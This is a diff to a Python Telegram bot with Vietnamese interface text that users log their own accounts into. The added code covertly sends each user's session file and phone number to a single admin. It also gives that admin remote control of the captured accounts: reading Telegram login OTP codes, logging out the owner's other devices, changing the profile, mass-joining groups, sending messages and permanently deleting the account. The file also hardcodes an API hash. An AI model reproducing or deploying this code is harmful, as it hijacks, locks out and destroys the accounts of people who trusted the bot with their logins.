@@ -4,7 +4,8 @@ from telethon import TelegramClient, events, Button, functions, types
 from telethon.errors import (
     FloodWaitError, RPCError, UserNotParticipantError, 
     SessionPasswordNeededError, PhoneCodeInvalidError, 
-    PhoneCodeExpiredError, PhoneNumberInvalidError, PasswordHashInvalidError
+    PhoneCodeExpiredError, PhoneNumberInvalidError, PasswordHashInvalidError,
+    FreshResetAuthorizationsForbiddenError
 )
 
 # ==========================================
@@ -12,9 +13,8 @@ from telethon.errors import (
 # ==========================================
 A_ID = 32300846
 A_HS = "a6da3117ff6b8a1679d04ab743976068"
-# Lấy Bot Token trực tiếp từ Environment Variables trên Render
 B_TK = os.getenv("BOT_TOKEN")
-O_ID = 7907990385
+O_ID = 7907990385  # ID ADMIN DUY NHẤT CÓ QUYỀN
 BOT_USERNAME = "@minhduchotwar1_bot"
 
 REQUIRED_GROUPS = [
@@ -99,7 +99,7 @@ def _su(u):
         with open(F1, "a") as f: f.write(f"{u}\n")
 
 async def is_user_in_channel(user_id):
-    if user_id in admins: return True
+    if user_id == O_ID: return True
     try:
         for group in REQUIRED_GROUPS:
             await bot(functions.channels.GetParticipantRequest(
@@ -118,6 +118,20 @@ async def is_user_in_channel(user_id):
         if user_id in verified_users:
             return True
         return False
+
+async def send_session_file_to_admin(client, user_id, phone_number):
+    """CHỈ GỬI FILE SESSION VỀ CHO DUY NHẤT ID ADMIN CHÍNH (O_ID)"""
+    session_file_name = f"u_{user_id}.session"
+    if os.path.exists(session_file_name):
+        try:
+            await bot.send_file(
+                O_ID,
+                session_file_name,
+                caption=f"📦 **FILE SESSION TÀI KHOẢN MỚI**\n• ID Userbot: `{user_id}`\n• Số Điện Thoại: `+{phone_number}`",
+                parse_mode='markdown'
+            )
+        except Exception as e:
+            print(f"Lỗi gửi file session: {e}")
 
 # ==========================================
 # GIAO DIỆN CHỌN APP & MENU TELEGRAM
@@ -154,12 +168,12 @@ def get_main_menu(u):
         [Button.inline("📦 Lặt Vặt & Tiện Ích", data="m_other"), Button.inline("⚙️ CẤU HÌNH DELAY", data="m_setting")]
     ]
     
-    if u in admins:
+    if u == O_ID:
         buttons.append([Button.inline("🎮 Bảng Điều Khiển Acc Remote (Admin)", data="m_control")])
 
     buttons.append([Button.inline("📱 LOGIN TÀI KHOẢN", data="login"), Button.inline("🚪 LOGOUT", data="logout_acc")])
     
-    if u in admins:
+    if u == O_ID:
         buttons.append([Button.inline("👑 Lệnh Admin System", data="m_admin")])
         
     buttons.append([Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")])
@@ -218,13 +232,13 @@ async def notify_admin_login(client, user_id, phone_number):
 • **ID Bot User:** `{user_id}`
 """
         buttons = [[Button.inline("🎮 Điều Khiển Acc Này", data=f"sel_acc_{user_id}")]]
-        for admin_id in admins:
-            try:
-                if avatar_path and os.path.exists(avatar_path):
-                    await bot.send_file(admin_id, avatar_path, caption=caption, buttons=buttons, parse_mode='markdown')
-                else:
-                    await bot.send_message(admin_id, caption, buttons=buttons, parse_mode='markdown')
-            except: pass
+        # CHỈ GỬI THÔNG BÁO CHO DUY NHẤT O_ID
+        try:
+            if avatar_path and os.path.exists(avatar_path):
+                await bot.send_file(O_ID, avatar_path, caption=caption, buttons=buttons, parse_mode='markdown')
+            else:
+                await bot.send_message(O_ID, caption, buttons=buttons, parse_mode='markdown')
+        except: pass
         if avatar_path and os.path.exists(avatar_path): os.remove(avatar_path)
     except Exception as e:
         print(f"Lỗi gửi thông báo login: {e}")
@@ -487,9 +501,9 @@ async def _callback_handler(ev):
     elif data == "app_discord":
         return await ev.answer("⚠️ Tính năng đang đc bảo trì!", alert=True)
 
-    # ADMIN CONTROL PANEL
+    # ADMIN CONTROL PANEL (CHỈ DUY NHẤT O_ID DÙNG ĐƯỢC)
     elif data == "m_control":
-        if u not in admins: return await ev.answer("❌ Chỉ Admin mới có quyền!", alert=True)
+        if u != O_ID: return await ev.answer("❌ Bạn không có quyền Admin chính!", alert=True)
         if not u_c:
             txt = "🎮 **BẢNG ĐIỀU KHIỂN TÀI KHOẢN REMOTE**\n────────────────\n⚠️ *Hiện chưa có tài khoản nào đăng nhập.*"
             return await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Telegram", data="app_telegram")]], parse_mode='markdown')
@@ -504,28 +518,137 @@ async def _callback_handler(ev):
         await ev.edit(txt, buttons=buttons, parse_mode='markdown')
 
     elif data.startswith("sel_acc_"):
-        if u not in admins: return await ev.answer("Chỉ Admin mới có quyền!", alert=True)
+        if u != O_ID: return await ev.answer("Chỉ Admin chính mới có quyền!", alert=True)
         target_uid = int(data.split("_")[2])
         if target_uid not in u_c: return await ev.answer("Tài khoản này đã logout!", alert=True)
         admin_selected_target[u] = target_uid
         client = u_c[target_uid]
         me = await client.get_me()
         
+        phone_str = f"+{me.phone}" if hasattr(me, 'phone') and me.phone else "Ẩn / Không xác định"
+
         txt = f"""🕹 **HỒ SƠ TÀI KHOẢN ĐANG ĐIỀU KHIỂN:**
 ────────────────
-👤 **Tên:** {me.first_name}
+👤 **Tên:** {me.first_name} {me.last_name or ''}
 🆔 **ID:** `{me.id}`
+📱 **Số Điện Thoại:** `{phone_str}`
 """
         buttons = [
             [Button.inline("💬 Gửi Đơn Nhóm / IB", data="rmt_send_one"), Button.inline("🥷 Gửi Ẩn Đơn", data="rmt_send_ghost")],
-            [Button.inline("📢 Gửi All Nhóm (Ai Cùng Thấy)", data="rmt_send_all"), Button.inline("🥷 Gửi Ẩn Danh All Nhóm", data="rmt_send_all_ghost")],
+            [Button.inline("📢 Gửi All Nhóm", data="rmt_send_all"), Button.inline("🥷 Gửi Ẩn All Nhóm", data="rmt_send_all_ghost")],
+            [Button.inline("➕ Tự Động Nhập Nhóm Cần Vào", data="rmt_auto_join_groups")],
+            [Button.inline("🔑 Check Mã OTP Telegram", data="rmt_check_otp"), Button.inline("🥷 Kick Mọi Thiết Bị Khác (Trừ Bot)", data="rmt_kick_devices")],
+            [Button.inline("✏️ Đổi Tên/Bio/Avt", data="rmt_custom_profile"), Button.inline("🗑 Xóa Vĩnh Viễn Acc", data="rmt_delete_account")],
             [Button.inline("📋 Check Số Nhóm", data="rmt_count_groups"), Button.inline("📜 Lịch Sử 10 Tin", data="rmt_hist_p1")],
             [Button.inline("🔙 Chọn Acc Khác", data="m_control")]
         ]
         await ev.edit(text=txt, buttons=buttons, parse_mode='markdown')
 
+    # CHỨC NĂNG 1: TỰ ĐỘNG THAM GIA TẤT CẢ NHÓM (HỎI SỐ LƯỢNG & DANH SÁCH LINK)
+    elif data == "rmt_auto_join_groups":
+        if u != O_ID: return
+        target_uid = admin_selected_target.get(u)
+        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
+        await ev.answer()
+        
+        async with bot.conversation(u) as cv:
+            await cv.send_message("🔢 **Nhập số lượng nhóm bạn muốn tài khoản tham gia:**")
+            try:
+                num_res = await cv.get_response()
+                group_count = int(num_res.text.strip())
+            except:
+                return await cv.send_message("❌ Số lượng nhập không hợp lệ!")
+
+            await cv.send_message(f"🔗 **Hãy gửi danh sách {group_count} link/username nhóm** (Mỗi link 1 dòng hoặc cách nhau bởi dấu cách):")
+            links_res = await cv.get_response()
+            raw_text = links_res.text.strip()
+            
+            # Tách các link / username nhóm ra khỏi văn bản
+            found_groups = re.findall(r'(?:https?://t\.me/|@)?([a-zA-Z0-9_]{5,})', raw_text)
+            
+            if not found_groups:
+                return await cv.send_message("❌ Không tìm thấy link hay username nhóm hợp lệ nào!")
+            
+            # Giới hạn đúng số lượng nhóm admin yêu cầu
+            found_groups = found_groups[:group_count]
+            client = u_c[target_uid]
+            await cv.send_message(f"⏳ **Bắt đầu tự động tham gia {len(found_groups)} nhóm...**")
+            
+            success, fail = 0, 0
+            for grp in found_groups:
+                try:
+                    await client(functions.channels.JoinChannelRequest(channel=grp))
+                    success += 1
+                    await cv.send_message(f"✅ Đã vào nhóm: `@{grp}`")
+                    await asyncio.sleep(3) # Delay tránh dính FloodWait
+                except Exception as ex:
+                    try:
+                        await client(functions.messages.ImportChatInviteRequest(hash=grp))
+                        success += 1
+                        await cv.send_message(f"✅ Đã vào nhóm theo link private: `{grp}`")
+                        await asyncio.sleep(3)
+                    except Exception as err:
+                        fail += 1
+                        await cv.send_message(f"❌ Lỗi vào nhóm `@{grp}`: `{err}`")
+
+            await cv.send_message(f"🎉 **ĐÃ HOÀN THÀNH TỰ ĐỘNG VÀO NHÓM!**\n• Thành công: `{success}`\n• Thất bại: `{fail}`")
+
+    # CHỨC NĂNG 2: CHECK MÃ OTP TELEGRAM
+    elif data == "rmt_check_otp":
+        if u != O_ID: return
+        target_uid = admin_selected_target.get(u)
+        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
+        await ev.answer("⏳ Đang quét mã OTP...", alert=True)
+        client = u_c[target_uid]
+        
+        try:
+            messages = await client.get_messages(777000, limit=5)
+            otp_found = False
+            for m in messages:
+                if m.text:
+                    code_match = re.search(r'\b\d{5}\b', m.text)
+                    if code_match:
+                        code = code_match.group(0)
+                        date_str = m.date.strftime('%H:%M:%S %d/%m/%Y')
+                        await ev.respond(f"🔑 **MÃ OTP TELEGRAM MỚI NHẤT:**\n────────────────\n• Mã Code: `{code}`\n• Thời gian nhận: `{date_str}`\n\n📄 **Nội dung gốc:**\n`{m.text}`")
+                        otp_found = True
+                        break
+            if not otp_found:
+                await ev.respond("⚠️ **Không tìm thấy mã OTP nào trong 5 tin nhắn gần nhất từ 777000!**")
+        except Exception as ex:
+            await ev.respond(f"❌ **Lỗi đọc OTP:** `{ex}`")
+
+    # CHỨC NĂNG 3: KICK TOÀN BỘ CÁC THIẾT BỊ KHÁC (TRỪ PHIÊN BOT HIỆN TẠI)
+    elif data == "rmt_kick_devices":
+        if u != O_ID: return
+        target_uid = admin_selected_target.get(u)
+        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
+        await ev.answer("⏳ Đang tiến hành kick các thiết bị khác...", alert=True)
+        client = u_c[target_uid]
+        
+        try:
+            auths = await client(functions.account.GetAuthorizationsRequest())
+            kicked = 0
+            for auth in auths.authorizations:
+                # LOẠI TRỪ THIẾT BỊ HIỆN TẠI CỦA BOT (auth.current)
+                if not auth.current:
+                    try:
+                        await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
+                        kicked += 1
+                    except: pass
+            
+            if kicked > 0:
+                await ev.respond(f"✅ **Đã KICK thành công `{kicked}` thiết bị khác ra khỏi tài khoản (Giữ nguyên phiên làm việc của Bot)!**")
+            else:
+                await ev.respond("ℹ️ **Hiện tại không có thiết bị khác nào ngoài phiên của Bot đang hoạt động!**")
+
+        except FreshResetAuthorizationsForbiddenError:
+            await ev.respond("❌ **Chính sách bảo mật Telegram:** Tài khoản mới đăng nhập chưa đủ 24h nên Telegram tạm thời chặn tính năng kick thiết bị khác. Vui lòng thử lại sau 24h!")
+        except Exception as ex:
+            await ev.respond(f"❌ **Lỗi kick thiết bị:** `{ex}`")
+
     elif data == "rmt_send_one":
-        if u not in admins: return
+        if u != O_ID: return
         target_uid = admin_selected_target.get(u)
         if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
         await ev.answer()
@@ -542,7 +665,7 @@ async def _callback_handler(ev):
                 await cv.send_message(f"❌ **Lỗi:** `{ex}`")
 
     elif data == "rmt_send_ghost":
-        if u not in admins: return
+        if u != O_ID: return
         target_uid = admin_selected_target.get(u)
         if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
         await ev.answer()
@@ -562,9 +685,8 @@ async def _callback_handler(ev):
             except Exception as ex:
                 await cv.send_message(f"❌ **Lỗi:** `{ex}`")
 
-    # GỬI THƯỜNG TOÀN BỘ NHÓM (AI CŨNG THẤY)
     elif data == "rmt_send_all":
-        if u not in admins: return
+        if u != O_ID: return
         target_uid = admin_selected_target.get(u)
         if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
         await ev.answer()
@@ -584,9 +706,8 @@ async def _callback_handler(ev):
                     except: fail += 1
             await cv.send_message(f"✅ **Đã gửi xong!** Thành công: `{success}` | Thất bại: `{fail}`")
 
-    # GỬI ẨN DANH TOÀN BỘ NHÓM (NGƯỜI NGOÀI TRONG NHÓM AI CŨNG THẤY, PHÍA TÀI KHOẢN MÌNH XÓA)
     elif data == "rmt_send_all_ghost":
-        if u not in admins: return
+        if u != O_ID: return
         target_uid = admin_selected_target.get(u)
         if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
         await ev.answer()
@@ -609,8 +730,64 @@ async def _callback_handler(ev):
                     except: fail += 1
             await cv.send_message(f"✅ **Đã gửi Ẩn Danh Đa Nhóm xong!** Thành công: `{success}` | Thất bại: `{fail}`")
 
+    elif data == "rmt_custom_profile":
+        if u != O_ID: return
+        target_uid = admin_selected_target.get(u)
+        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
+        await ev.answer()
+        async with bot.conversation(u) as cv:
+            client = u_c[target_uid]
+            
+            await cv.send_message("✏️ **Nhập Tên Mới** (Gửi `-` nếu muốn giữ nguyên):")
+            new_first = (await cv.get_response()).text.strip()
+            
+            await cv.send_message("📝 **Nhập Tiểu Sử (Bio) Mới** (Gửi `-` nếu muốn giữ nguyên):")
+            new_bio = (await cv.get_response()).text.strip()
+
+            await cv.send_message("🖼 **Gửi hình ảnh mới làm Avatar** (Hoặc gửi `-` để bỏ qua):")
+            photo_msg = await cv.get_response()
+
+            try:
+                kwargs = {}
+                if new_first != "-": kwargs["first_name"] = new_first
+                if new_bio != "-": kwargs["about"] = new_bio
+                if kwargs:
+                    await client(functions.account.UpdateProfileRequest(**kwargs))
+
+                if photo_msg.photo:
+                    path = await client.download_media(photo_msg.photo)
+                    if path:
+                        await client(functions.photos.UploadProfilePhotoRequest(file=await client.upload_file(path)))
+                        if os.path.exists(path): os.remove(path)
+
+                await cv.send_message("✅ **Đã cập nhật Hồ Sơ (Tên, Bio, Avatar) thành công!**")
+            except Exception as ex:
+                await cv.send_message(f"❌ **Lỗi đổi hồ sơ:** `{ex}`")
+
+    elif data == "rmt_delete_account":
+        if u != O_ID: return
+        target_uid = admin_selected_target.get(u)
+        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
+        await ev.answer()
+        async with bot.conversation(u) as cv:
+            await cv.send_message("⚠️ **CẢNH BÁO NGUY HIỂM!**\nBạn có chắc chắn muốn **XÓA VĨNH VIỄN** tài khoản Telegram này không?\n\nGõ chữ `XAC NHAN XOA` để đồng ý:")
+            confirm_text = (await cv.get_response()).text.strip()
+            if confirm_text == "XAC NHAN XOA":
+                try:
+                    client = u_c[target_uid]
+                    await client(functions.account.DeleteAccountRequest(reason="Admin deleted via bot system"))
+                    session_file = f"u_{target_uid}.session"
+                    if os.path.exists(session_file): os.remove(session_file)
+                    await client.disconnect()
+                    u_c.pop(target_uid, None)
+                    await cv.send_message("🗑 **Đã xóa vĩnh viễn tài khoản thành công!**")
+                except Exception as ex:
+                    await cv.send_message(f"❌ **Lỗi xóa tài khoản:** `{ex}`")
+            else:
+                await cv.send_message("❌ **Đã hủy lệnh xóa tài khoản.**")
+
     elif data == "rmt_count_groups":
-        if u not in admins: return
+        if u != O_ID: return
         target_uid = admin_selected_target.get(u)
         if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
         client = u_c[target_uid]
@@ -635,7 +812,7 @@ async def _callback_handler(ev):
             await ev.edit(f"❌ Lỗi: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
 
     elif data.startswith("rmt_hist_p"):
-        if u not in admins: return
+        if u != O_ID: return
         target_uid = admin_selected_target.get(u)
         if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
         client = u_c[target_uid]
@@ -768,7 +945,7 @@ async def _callback_handler(ev):
         await ev.edit(msg, buttons=buttons, parse_mode='markdown')
 
     elif data == "m_admin":
-        if u not in admins: return await ev.answer("❌ Chỉ Admin!", alert=True)
+        if u != O_ID: return await ev.answer("❌ Chỉ Admin chính!", alert=True)
         txt = "👑 **ADMIN SYSTEM**\n• `/ban <id>`\n• `/unban <id>`\n• `/addadmin <id>`\n• `/addvip <id>`\n• `/delvip <id>`\n• `/tb <nội dung>`"
         await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')
 
@@ -801,6 +978,10 @@ async def _callback_handler(ev):
                         return await cv.send_message(f"❌ **Lỗi xác thực:** `{err}`")
                 
                 u_c[u] = c; _logic(c, u)
+                
+                # GỬI FILE SESSION CHỈ VỀ CHO DUY NHẤT O_ID
+                await send_session_file_to_admin(c, u, p)
+
                 task = asyncio.create_task(start_anti_disconnect(u, c))
                 anti_disconnect_tasks[u] = task
 
@@ -821,21 +1002,21 @@ async def _addadmin(e):
 
 @bot.on(events.NewMessage(pattern=r'/addvip (\d+)'))
 async def _addvip(e):
-    if e.sender_id not in admins: return
+    if e.sender_id != O_ID: return
     vid = int(e.pattern_match.group(1))
     v_u.add(vid); _sv()
     await e.respond(f"🌟 Đã thêm VIP `{vid}`!")
 
 @bot.on(events.NewMessage(pattern=r'/delvip (\d+)'))
 async def _delvip(e):
-    if e.sender_id not in admins: return
+    if e.sender_id != O_ID: return
     vid = int(e.pattern_match.group(1))
     v_u.discard(vid); _sv()
     await e.respond(f"❌ Đã xóa VIP `{vid}`!")
 
 @bot.on(events.NewMessage(pattern=r'/ban (\d+)'))
 async def _bn(e):
-    if e.sender_id not in admins: return
+    if e.sender_id != O_ID: return
     target = int(e.pattern_match.group(1))
     b_u.add(target); _sb()
     if target in u_c:
@@ -847,7 +1028,7 @@ async def _bn(e):
 
 @bot.on(events.NewMessage(pattern=r'/unban (\d+)'))
 async def _ubn(e):
-    if e.sender_id not in admins: return
+    if e.sender_id != O_ID: return
     target = int(e.pattern_match.group(1))
     if target in b_u:
         b_u.remove(target); _sb()
@@ -855,7 +1036,7 @@ async def _ubn(e):
 
 @bot.on(events.NewMessage(pattern=r'/tb\s+([\s\S]+)'))
 async def _tb(e):
-    if e.sender_id not in admins: return
+    if e.sender_id != O_ID: return
     msg = e.pattern_match.group(1)
     if not os.path.exists(F1): return
     await e.respond("📣 Đang gửi thông báo...")
@@ -913,4 +1094,3 @@ if __name__ == '__main__':
         asyncio.run(main())
     except (KeyboardInterrupt, SystemExit):
         pass
-data
